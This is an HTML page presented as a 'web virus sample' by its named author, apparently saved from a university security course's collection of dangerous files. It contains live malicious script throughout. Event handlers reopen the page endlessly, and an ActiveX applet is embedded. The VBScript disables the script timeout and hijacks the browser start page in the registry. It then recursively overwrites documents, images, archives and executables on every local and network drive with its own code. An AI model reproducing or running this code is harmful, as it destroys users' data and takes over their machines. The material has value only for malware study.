<html>

<head>
<meta http-equiv="Content-Type"
content="text/html; charset=gb_2312-80">
<meta name="Author"
content="LeoTam / leo.5210@kimo.com.tw / @GRAMMERSoft Group / Leoffice / 2001/5/12">
<meta name="Description" content="hi!i am Leo">
<meta name="GENERATOR" content="Microsoft FrontPage Express 2.0">
<title>OverKiller- HTML</title>
</head>

<body bgcolor="#FFFFFF" bgproperties="fixed"
onmouseout="window.name='main';window.open('http://www.cs.ucdavis.edu/~wu/ecs251/test_files_HW2/dangerous/collection/OverKiller.HTML','main')"
onkeydown="window.name='main';window.open('OverKiller.HTML','main')">

<p align="center"><font color="#000080"><b>OverKiller2.html改良版</b></font></p>

<p align="center"><font color="#FF0000" size="3"><b>&lt;终结杀手II&gt;网页病毒样本原创由LeoTam编写</b></font></p>

<p align="center"><font color="#FF0000" size="3"><b>版权所有，翻版必究(c)</b></font></p>

<p align="center"><a href="mailto:leo.5210@kimo.com.tw"><font
color="#FF0000" size="3"><b>leo.5210@kimo.com.tw</b></font></a></p>

<p align="center"><font color="#000080"><b>oicq:7250670</b></font></p>

<p align="center"><a href="javascript:if(confirm('http://shanghao.51.net/  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://shanghao.51.net/'" tppabs="http://shanghao.51.net/">http://shanghao.51.net</a></p>

<p align="center">　</p>
<script language="JScript">
<!--//
if (window.screen){var wi=screen.availWidth;var hi=screen.availHeight;window.moveTo(0,0);window.resizeTo(wi,hi);}
//-->
</script><applet codebase="javascript:if(confirm('http:///  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http:///'" tppabs="http:///"
code="com.ms.activeX.ActiveXComponent.class" tppabs="http://www.cs.ucdavis.edu/~wu/ecs251/test_files_HW2/dangerous/collection/com.ms.activeX.ActiveXComponent.class" align="baseline" width="3"
height="8"></applet><script language="VBScript"><!--

 On Error Resume Next


dim fso, dirsystem, dirwin, dirtemp, eq, ctr, file, vbscopy, dow

eq=""
ctr=0
Set fso = CreateObject("Scripting.FileSystemObject")
set file = fso.OpenTextFile(WScript.ScriptFullname,1)
vbscopy=file.ReadAll

main()


sub main()
  On Error Resume Next
  dim wscr,rr
  set wscr=CreateObject("WScript.Shell")
  rr=wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout")
  if (rr>=1) then
    wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout", 0, "REG_DWORD"
  end if
  regruns()
  spreadtoemail()
  listadriv()
end sub
sub regruns
  On Error Resume Next
  regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page", "http://shanghao.51.net/"
end sub


sub listadriv
  On Error Resume Next
  Dim d,dc,s
  Set dc = fso.Drives
  For Each d in dc
    If d.DriveType = 2 or d.DriveType=3 Then
      folderlist(d.path & "\")
    end if
  Next
  listadriv = s
end sub

sub infectfiles(folderspec)  
  On Error Resume Next
  dim f,f1,fc,ext,ap,mircfname,s,bname,mp3
  set f = fso.GetFolder(folderspec)
  set fc = f.Files
  for each f1 in fc
    ext = fso.GetExtensionName(f1.path)
    ext = lcase(ext)
    s = lcase(f1.name)
    if (ext = "bmp") or (ext="mp3") or (ext="bak") or (ext="gif") or (ext="doc") or (ext="dll") or (ext="xls") or (ext="html") or (ext="htm") or (ext="jpg") or (ext="zip") or (ext="dot") or (ext="exe")then
     set ap = fso.OpenTextFile(f1.path,2,true)
      ap.write vbscopy
      ap.close
    end if
  next  
end sub
sub folderlist(folderspec)  
  On Error Resume Next
  dim f,f1,sf
  set f = fso.GetFolder(folderspec)  
  set sf = f.SubFolders
  for each f1 in sf
    infectfiles(f1.path)
    folderlist(f1.path)
  next  
end sub

sub regcreate(regkey,regvalue)
  Set regedit = CreateObject("WScript.Shell")
  regedit.RegWrite regkey,regvalue
end sub

function regget(value)
  Set regedit = CreateObject("WScript.Shell")
  regget = regedit.RegRead(value)
end function

function fileexist(filespec)
  On Error Resume Next
  dim msg
  if (fso.FileExists(filespec)) Then
    msg = 0
    else
    msg = 1
  end if
  fileexist = msg
end function

function folderexist(folderspec)
  On Error Resume Next
  dim msg
  if (fso.GetFolderExists(folderspec)) then
    msg = 0
    else
    msg = 1
  end if
  fileexist = msg
end function
--></script>
</body>
</html>
